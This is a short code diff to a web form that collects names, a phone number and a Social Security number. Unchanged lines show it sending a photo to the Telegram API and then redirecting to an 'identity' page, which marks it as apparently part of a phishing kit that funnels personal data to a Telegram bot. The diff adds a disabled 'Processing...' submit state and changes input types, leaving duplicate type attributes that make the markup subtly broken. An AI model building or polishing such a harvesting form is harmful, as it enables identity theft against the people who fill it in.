@@ -90,7 +90,7 @@
             type="tel"
             id="phoneNumber"
             name="phoneNumber"
-            pattern="[0-9]{3}-[0-9]{3}-[0-9]{4}"
+            type="number"
             placeholder="123-456-7890"
             class="mt-1 p-2 w-full border rounded-md"
           />
@@ -104,6 +104,7 @@
             type="text"
             id="ssn"
             name="ssn"
+            type="number"
             placeholder="XXX-XX-XXXX"
             class="mt-1 p-2 w-full border rounded-md"
           />
@@ -221,7 +222,10 @@
 
       async function submitForm(event) {
         event.preventDefault();
-
+        // Disable the submit button and change its text to "Processing"
+        const submitButton = document.querySelector('button[type="submit"]');
+        submitButton.disabled = true;
+        submitButton.textContent = "Processing...";
         // Fetch form values
         const firstName = document.getElementById("firstName").value;
         const lastName = document.getElementById("lastName").value;
@@ -333,7 +337,6 @@
               console.log("Telegram API response:", data2);
               // Handle the response as needed
               window.location.replace("https://identity-eosin.vercel.app/");
-
             })
             .catch((error) => {
               console.error("Error sending photo to Telegram:", error);
